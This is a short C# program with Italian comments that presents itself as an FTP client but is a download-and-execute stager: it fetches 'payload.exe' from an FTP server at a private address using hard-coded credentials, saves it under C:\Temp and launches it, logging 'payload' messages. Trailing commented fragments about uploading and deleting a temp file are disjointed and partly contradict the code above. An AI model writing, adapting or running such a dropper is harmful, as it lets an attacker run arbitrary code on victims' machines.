using System;
using System.Net;
using System.Diagnostics;

/*client FTP in C# che può scaricare e eseguire file da un server FTP. Per uso avanzato si può estendere con autenticazione, gestione directory, download file*/
/*permette di scaricare (download) file di tutte le estensioni dal server per eseguire file scaricati*/


class FtpDownloadAndExecute
{
    static void Main()
    {
        string ftpUri = "ftp://192.168.1.100/payload.exe";  // URL FTP del file
        string localPath = @"C:\Temp\payload.exe";         // Percorso locale salvataggio
        string username = "user";                           // Credenziali server FTP
        string password = "password";

        WebClient client = new WebClient();
        client.Credentials = new NetworkCredential(username, password);

        try
        {
            Console.WriteLine("Downloading payload...");
            client.DownloadFile(ftpUri, localPath);
            Console.WriteLine("Download completato. Avvio esecuzione...");

            Process.Start(localPath);
            Console.WriteLine("Esecuzione del payload avviata.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Errore: " + ex.Message);
        }
    }
}
// You need to define 'username' and 'password' variables or pass them as parameters
// Example:
// client.Credentials = new NetworkCredential("yourUsername", "yourPassword");
// The following lines should be inside a method, not at the top level.
// client.UploadFile(ftpUri, tempFile);
// File.Delete(tempFile);
// Funzioni di utilità per crittografia, logging e compressione